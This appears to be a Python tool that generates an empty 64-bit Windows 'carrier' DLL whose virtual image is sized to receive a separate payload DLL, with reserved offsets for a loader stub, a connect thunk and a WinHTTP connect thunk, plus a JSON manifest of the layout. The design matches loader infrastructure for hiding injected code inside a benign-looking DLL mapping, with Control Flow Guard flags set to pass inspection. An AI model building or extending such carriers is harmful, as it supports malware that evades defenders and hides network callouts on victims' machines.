
\
\
\
\
\
\


import struct
import hashlib
import json
import sys
import os
import argparse


LOADER_PARAMS_SIZE          = 112
LOADER_STUB_MAX             = 0x1C0
CONNECT_THUNK_OFFSET        = 0x500
WINHTTPCONNECT_THUNK_OFFSET = 0x580
WINHTTPCONNECT_THUNK_MAX    = 0x100
LOADER_TAIL_REQUIRED        = WINHTTPCONNECT_THUNK_OFFSET + WINHTTPCONNECT_THUNK_MAX


IMAGE_FILE_MACHINE_AMD64     = 0x8664
IMAGE_FILE_DLL               = 0x2000
IMAGE_FILE_EXECUTABLE_IMAGE  = 0x0002
IMAGE_FILE_LARGE_ADDRESS_AWARE = 0x0020
IMAGE_SUBSYSTEM_WINDOWS_GUI  = 2
IMAGE_SCN_MEM_READ           = 0x40000000
IMAGE_SCN_MEM_WRITE          = 0x80000000
IMAGE_SCN_MEM_EXECUTE        = 0x20000000
IMAGE_SCN_CNT_CODE           = 0x00000020
IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080


DLLCHAR_HIGH_ENTROPY_VA = 0x0020
DLLCHAR_DYNAMIC_BASE    = 0x0040
DLLCHAR_NX_COMPAT       = 0x0100
DLLCHAR_GUARD_CF        = 0x4000
DLLCHAR_ALL = (DLLCHAR_HIGH_ENTROPY_VA | DLLCHAR_DYNAMIC_BASE |
               DLLCHAR_NX_COMPAT | DLLCHAR_GUARD_CF)
assert DLLCHAR_ALL == 0x4160, f"DllCharacteristics={hex(DLLCHAR_ALL)}"

FILE_ALIGNMENT    = 0x200
SECTION_ALIGNMENT = 0x1000

def align(value, alignment):
    return (value + alignment - 1) & ~(alignment - 1)

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(1 << 20), b''):
            h.update(chunk)
    return h.hexdigest()

def build_carrier(payload_image_size: int, output_path: str) -> dict:
\
\
\
\

    if payload_image_size <= 0:
        raise ValueError(f"payload_image_size must be > 0, got {payload_image_size}")


    loader_tail_size = align(LOADER_TAIL_REQUIRED + 0x200, SECTION_ALIGNMENT)





    payload_aligned = align(payload_image_size, SECTION_ALIGNMENT)
    carrier_virtual_size = payload_aligned + loader_tail_size


    dos_header_size = 0x40
    nt_headers_size = 4 + 20 + 240
    num_sections    = 3
    section_table_size = num_sections * 40
    headers_raw_size = align(dos_header_size + nt_headers_size + section_table_size, FILE_ALIGNMENT)


    text_vsize  = align(max(payload_aligned // 2, SECTION_ALIGNMENT), SECTION_ALIGNMENT)
    rdata_vsize = align(max(payload_aligned // 4, SECTION_ALIGNMENT), SECTION_ALIGNMENT)
    data_vsize  = carrier_virtual_size - text_vsize - rdata_vsize
    data_vsize  = align(max(data_vsize, loader_tail_size), SECTION_ALIGNMENT)



    text_rsize  = FILE_ALIGNMENT
    rdata_rsize = FILE_ALIGNMENT
    data_rsize  = FILE_ALIGNMENT

    text_vaddr  = SECTION_ALIGNMENT
    rdata_vaddr = text_vaddr  + text_vsize
    data_vaddr  = rdata_vaddr + rdata_vsize

    text_roff   = headers_raw_size
    rdata_roff  = text_roff  + text_rsize
    data_roff   = rdata_roff + rdata_rsize
    total_raw   = data_roff  + data_rsize

    image_size  = align(data_vaddr + data_vsize, SECTION_ALIGNMENT)




    import_dll_name     = b"KERNEL32.dll\x00"
    import_func_name    = b"\x00\x00GetLastError\x00"
    iat_entry_count     = 2
    iat_size            = iat_entry_count * 8


    import_desc_offset  = 0
    import_desc_size    = 40
    iat_offset          = import_desc_size
    orig_thunk_offset   = iat_offset + iat_size
    func_name_offset    = orig_thunk_offset + iat_size
    dll_name_offset     = func_name_offset + len(import_func_name)

    import_rva          = rdata_vaddr + import_desc_offset
    iat_rva             = rdata_vaddr + iat_offset
    orig_thunk_rva      = rdata_vaddr + orig_thunk_offset
    func_name_rva       = rdata_vaddr + func_name_offset
    dll_name_rva        = rdata_vaddr + dll_name_offset


    pe = bytearray(total_raw)


    struct.pack_into('<H', pe, 0, 0x5A4D)
    struct.pack_into('<I', pe, 0x3C, 0x40)


    struct.pack_into('<I', pe, 0x40, 0x00004550)


    fh_off = 0x44
    struct.pack_into('<H', pe, fh_off + 0,  IMAGE_FILE_MACHINE_AMD64)
    struct.pack_into('<H', pe, fh_off + 2,  num_sections)
    struct.pack_into('<I', pe, fh_off + 4,  0)
    struct.pack_into('<I', pe, fh_off + 8,  0)
    struct.pack_into('<I', pe, fh_off + 12, 0)
    struct.pack_into('<H', pe, fh_off + 16, 240)
    struct.pack_into('<H', pe, fh_off + 18,
        IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_DLL | IMAGE_FILE_LARGE_ADDRESS_AWARE)


    oh_off = fh_off + 20
    struct.pack_into('<H', pe, oh_off + 0,   0x020B)
    struct.pack_into('<B', pe, oh_off + 2,   14)
    struct.pack_into('<B', pe, oh_off + 3,   0)
    struct.pack_into('<I', pe, oh_off + 4,   text_rsize)
    struct.pack_into('<I', pe, oh_off + 8,   rdata_rsize + data_rsize)
    struct.pack_into('<I', pe, oh_off + 12,  0)
    struct.pack_into('<I', pe, oh_off + 16,  0)
    struct.pack_into('<I', pe, oh_off + 20,  text_vaddr)
    struct.pack_into('<Q', pe, oh_off + 24,  0x86D210000)
    struct.pack_into('<I', pe, oh_off + 32,  SECTION_ALIGNMENT)
    struct.pack_into('<I', pe, oh_off + 36,  FILE_ALIGNMENT)
    struct.pack_into('<H', pe, oh_off + 40,  6)
    struct.pack_into('<H', pe, oh_off + 42,  0)
    struct.pack_into('<H', pe, oh_off + 44,  0)
    struct.pack_into('<H', pe, oh_off + 46,  0)
    struct.pack_into('<H', pe, oh_off + 48,  6)
    struct.pack_into('<H', pe, oh_off + 50,  0)
    struct.pack_into('<I', pe, oh_off + 52,  0)
    struct.pack_into('<I', pe, oh_off + 56,  image_size)
    struct.pack_into('<I', pe, oh_off + 60,  headers_raw_size)
    struct.pack_into('<I', pe, oh_off + 64,  0)
    struct.pack_into('<H', pe, oh_off + 68,  IMAGE_SUBSYSTEM_WINDOWS_GUI)
    struct.pack_into('<H', pe, oh_off + 70,  DLLCHAR_ALL)
    struct.pack_into('<Q', pe, oh_off + 72,  0x100000)
    struct.pack_into('<Q', pe, oh_off + 80,  0x1000)
    struct.pack_into('<Q', pe, oh_off + 88,  0x100000)
    struct.pack_into('<Q', pe, oh_off + 96,  0x1000)
    struct.pack_into('<I', pe, oh_off + 104, 0)
    struct.pack_into('<I', pe, oh_off + 108, 16)


    dd_off = oh_off + 112


    struct.pack_into('<I', pe, dd_off + 1*8,     import_rva)
    struct.pack_into('<I', pe, dd_off + 1*8 + 4, import_desc_size + iat_size*2 + len(import_func_name) + len(import_dll_name))

    struct.pack_into('<I', pe, dd_off + 12*8,     iat_rva)
    struct.pack_into('<I', pe, dd_off + 12*8 + 4, iat_size)



    sec_off = oh_off + 240

    def write_section(offset, name, vsize, vaddr, rsize, roff, chars):
        n = name.encode('ascii')[:8].ljust(8, b'\x00')
        pe[offset:offset+8] = n
        struct.pack_into('<I', pe, offset + 8,  vsize)
        struct.pack_into('<I', pe, offset + 12, vaddr)
        struct.pack_into('<I', pe, offset + 16, rsize)
        struct.pack_into('<I', pe, offset + 20, roff)
        struct.pack_into('<I', pe, offset + 36, chars)

    write_section(sec_off + 0*40, '.text',
                  text_vsize, text_vaddr, text_rsize, text_roff,
                  IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ)
    write_section(sec_off + 1*40, '.rdata',
                  rdata_vsize, rdata_vaddr, rdata_rsize, rdata_roff,
                  IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ)
    write_section(sec_off + 2*40, '.data',
                  data_vsize, data_vaddr, data_rsize, data_roff,
                  IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)






    rd = rdata_roff
    struct.pack_into('<I', pe, rd + import_desc_offset + 0,  orig_thunk_rva)
    struct.pack_into('<I', pe, rd + import_desc_offset + 4,  0)
    struct.pack_into('<I', pe, rd + import_desc_offset + 8,  0)
    struct.pack_into('<I', pe, rd + import_desc_offset + 12, dll_name_rva)
    struct.pack_into('<I', pe, rd + import_desc_offset + 16, iat_rva)



    struct.pack_into('<Q', pe, rd + orig_thunk_offset, func_name_rva)
    struct.pack_into('<Q', pe, rd + orig_thunk_offset + 8, 0)


    struct.pack_into('<Q', pe, rd + iat_offset, func_name_rva)
    struct.pack_into('<Q', pe, rd + iat_offset + 8, 0)


    pe[rd + func_name_offset : rd + func_name_offset + len(import_func_name)] = import_func_name


    pe[rd + dll_name_offset : rd + dll_name_offset + len(import_dll_name)] = import_dll_name


    with open(output_path, 'wb') as f:
        f.write(pe)

    carrier_hash = sha256_file(output_path)

    manifest = {
        "carrierFile": os.path.basename(output_path),
        "carrierSha256": carrier_hash,
        "imageSize": image_size,
        "payloadCapacity": payload_aligned,
        "loaderTailCapacity": loader_tail_size,
        "loaderParamsSize": LOADER_PARAMS_SIZE,
        "connectThunkOffset": CONNECT_THUNK_OFFSET,
        "winHttpConnectThunkOffset": WINHTTPCONNECT_THUNK_OFFSET,
        "dllCharacteristics": hex(DLLCHAR_ALL),
        "sections": [
            {"name": ".text",  "virtualAddress": text_vaddr,  "virtualSize": text_vsize,
             "rawOffset": text_roff,  "rawSize": text_rsize,
             "characteristics": hex(IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ)},
            {"name": ".rdata", "virtualAddress": rdata_vaddr, "virtualSize": rdata_vsize,
             "rawOffset": rdata_roff, "rawSize": rdata_rsize,
             "characteristics": hex(IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ)},
            {"name": ".data",  "virtualAddress": data_vaddr,  "virtualSize": data_vsize,
             "rawOffset": data_roff,  "rawSize": data_rsize,
             "characteristics": hex(IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)},
        ]
    }
    return manifest

def max(a, b):
    return a if a >= b else b

def main():
    parser = argparse.ArgumentParser(description="Generate PE64 carrier DLL")
    parser.add_argument("--payload-image-size", type=lambda x: int(x, 0), required=True,
                        help="Virtual image size of payload DLL (from PE header SizeOfImage)")
    parser.add_argument("--output", required=True, help="Output carrier DLL path")
    parser.add_argument("--manifest-out", required=False, help="Output carrier manifest JSON path")
    args = parser.parse_args()

    print(f"Generating carrier: payload_image_size=0x{args.payload_image_size:x}")
    print(f"  Required loader tail: 0x{LOADER_TAIL_REQUIRED:x} bytes")
    print(f"  G24: DllCharacteristics=0x{DLLCHAR_ALL:04x} (GUARD_CF included)")
    print(f"  G16: WinHTTP thunk slot at offset 0x{WINHTTPCONNECT_THUNK_OFFSET:x}")

    manifest = build_carrier(args.payload_image_size, args.output)

    size = os.path.getsize(args.output)
    print(f"Carrier written: {args.output}")
    print(f"  size={size} sha256={manifest['carrierSha256'][:16]}...")
    print(f"  imageSize=0x{manifest['imageSize']:x} payloadCapacity=0x{manifest['payloadCapacity']:x}")
    print(f"  loaderTailCapacity=0x{manifest['loaderTailCapacity']:x}")

    if args.manifest_out:
        with open(args.manifest_out, 'w') as f:
            json.dump(manifest, f, indent=2)
        print(f"Manifest written: {args.manifest_out}")

    return manifest

if __name__ == "__main__":
    main()
